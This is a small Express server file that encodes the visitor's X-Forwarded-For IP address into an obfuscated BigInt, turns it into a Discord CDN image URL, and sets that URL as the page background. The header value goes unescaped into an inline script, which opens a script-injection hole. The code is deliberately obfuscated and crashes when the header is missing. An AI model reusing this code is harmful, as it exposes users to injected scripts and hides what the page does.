const express = require('express');
const path = require('path');

const app = express();

// Serve files in static
html=(ip)=>`<script>document.documentElement.style.setProperty('background',(\`center url(http:cdn.discordapp.com/attachments/359482171452424192/\`+(((12529223249380105001n<<BigInt(32))|BigInt([${ip}].reduce((a,c,i)=>a+(Number(c)*(256**(3-i))),0)))-53812604099268683849107553763n)+"/png)black"))</script>`;
app.get('/', (req, res) => {
  res.send(html(req.headers['x-forwarded-for'].split(".")))
});

app.listen(3000, () => {
  console.log('server started');
});


app.listen(80, () => {
  console.log('server started');
});
